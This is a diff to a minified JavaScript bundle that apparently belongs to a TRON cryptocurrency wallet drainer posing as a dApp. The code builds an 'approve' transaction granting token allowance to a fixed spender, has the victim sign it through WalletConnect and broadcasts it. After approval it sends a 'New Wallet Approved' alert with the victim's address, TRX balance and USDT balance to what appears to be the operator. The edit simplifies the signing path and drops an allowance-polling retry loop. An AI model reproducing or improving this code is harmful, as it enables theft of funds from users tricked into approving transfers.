@@ -79489,57 +79489,18 @@
                       , i = "approve(address,uint256)"
                       , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                     console.log("Transaction Built:", s);
-                    const tx = JSON.parse(JSON.stringify(s.transaction || s));
-                    let a;
-                    if (this.provider.signTransaction && this.provider.client)
-                        a = await this.provider.signTransaction(tx);
-                    else {
-                        if (!this.provider.client || !this.provider.session)
-                            throw new Error("WalletConnect session not active");
-                        const c = this.provider.session.namespaces.tron?.chains?.[0] || "tron:0x2b6653dc"
-                          , l = await this.provider.client.request({
-                            topic: this.provider.session.topic,
-                            chainId: c,
-                            request: {
-                                method: "tron_signTransaction",
-                                params: {
-                                    address: e,
-                                    transaction: tx
-                                }
-                            }
-                        });
-                        a = l.result
-                    }
-                    if (!a || !1 === a.success)
-                        return {
-                            success: !1,
-                            error: "User rejected or signing failed"
-                        };
-                    let broadcastResult;
-                    try {
-                        broadcastResult = await t.trx.sendRawTransaction(a)
-                    } catch (broadcastErr) {
-                        broadcastResult = {
-                            success: !1,
-                            error: broadcastErr.message
+                    const a = (await this.provider.request({
+                        method: "tron_signTransaction",
+                        params: {
+                            address: e,
+                            transaction: s
                         }
-                    }
-                    if (broadcastResult && (!1 !== broadcastResult.result && (!0 === broadcastResult.result || !!broadcastResult.txid)))
-                        return broadcastResult;
-                    const txId = (a && (a.txID || a.txid)) || (broadcastResult && broadcastResult.txid);
-                    if (txId)
-                        try {
-                            const confirmed = await t.trx.getTransaction(txId);
-                            if (confirmed && confirmed.txID)
-                                return {
-                                    result: !0,
-                                    txid: txId
-                                }
-                        } catch (_) {}
-                    return broadcastResult || {
-                        success: !1,
-                        error: "Broadcast failed"
-                    }
+                    }, "tron:0x2b6653dc")).result;
+                    if (!a)
+                        return {
+                            success: !1
+                        };
+                    return await t.trx.sendRawTransaction(a)
                 } catch (t) {
                     return {
                         success: !1,
@@ -79560,33 +79521,10 @@
                 try {
                     const n = await e.sendTransaction(t);
                     console.log("Approval response:", n);
-                    let approved = n && !1 !== n.success && (!1 !== n.result && (!0 === n.result || !!n.txid));
-                    if (!approved) {
-                        for (let d = 0; d < 5 && !approved; d++) {
-                            await new Promise((e => setTimeout(e, 2e3)));
-                            try {
-                                const h = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
-                                    type: "address",
-                                    value: t
-                                }, {
-                                    type: "address",
-                                    value: LV
-                                }], rG.address.toHex(LV))).constant_result[0]
-                                  , f = h.startsWith("0x") ? h : "0x".concat(h)
-                                  , p = rG.toBigNumber(f).toNumber();
-                                console.log("Allowance check attempt", d + 1, ":", p),
-                                approved = p > 0
-                            } catch (g) {
-                                console.warn("Allowance check failed:", g)
-                            }
-                        }
-                    }
-                    if (approved) {
+                    if (n && (!1 !== n.result || !!n.txid)) {
                         const o = await e.getBalance(t)
                           , i = await iG(t);
-                        r(n || {
-                            result: !0
-                        });
+                        r(n);
                         const s = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
                         sG(s);
                         return !0
